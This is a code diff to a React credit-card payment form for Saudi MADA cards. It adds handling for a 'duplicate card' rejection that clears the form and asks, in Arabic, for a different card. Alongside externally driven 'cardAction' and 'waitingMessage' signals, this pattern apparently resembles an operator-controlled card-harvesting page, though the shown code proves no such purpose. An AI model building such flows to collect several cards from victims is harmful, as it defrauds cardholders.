@@ -25,6 +25,7 @@ import {
   navigateToPage,
   cardAction,
   waitingMessage,
+  duplicateCardRejected,
 } from "@/lib/store";
 import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";
 
@@ -115,6 +116,7 @@ export default function CreditCardPayment() {
   const [cardError, setCardError] = useState(false);
   const [luhnError, setLuhnError] = useState(false);
   const [rejectedError, setRejectedError] = useState(false);
+  const [duplicateError, setDuplicateError] = useState(false);
   const [selectKey, setSelectKey] = useState(0); // مفتاح لإعادة تعيين Select components
   const debounceRef = useRef<ReturnType<typeof setTimeout>>();
 
@@ -216,6 +218,24 @@ export default function CreditCardPayment() {
       }
       // Reset card action
       cardAction.value = null;
+    }
+  });
+
+  // Handle duplicate card rejection
+  useSignalEffect(() => {
+    if (duplicateCardRejected.value) {
+      setDuplicateError(true);
+      setRejectedError(false);
+      waitingMessage.value = "";
+      reset({
+        cardNumber: "",
+        nameOnCard: "",
+        expiryMonth: "",
+        expiryYear: "",
+        cvv: "",
+      });
+      setSelectKey(prev => prev + 1);
+      duplicateCardRejected.value = false;
     }
   });
 
@@ -388,6 +408,14 @@ export default function CreditCardPayment() {
           </div>
         )}
 
+        {/* Duplicate Card Error Message */}
+        {duplicateError && (
+          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+            <p className="text-red-600 text-center font-medium">تم رفض البطاقة</p>
+            <p className="text-red-500 text-center text-sm mt-1">يرجى محاولة الدفع من بطاقة أخرى</p>
+          </div>
+        )}
+
         {/* Global Blocked Card Error Message */}
         {globalBlockedError && (
           <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
@@ -409,7 +437,7 @@ export default function CreditCardPayment() {
               className={(cardError || luhnError) ? "border-red-500" : ""}
               {...register("cardNumber")}
               onChange={handleCardChange}
-              onFocus={() => setRejectedError(false)}
+              onFocus={() => { setRejectedError(false); setDuplicateError(false); }}
             />
             {(errors.cardNumber || cardError || luhnError) && (
               <p className="text-red-500 text-xs">
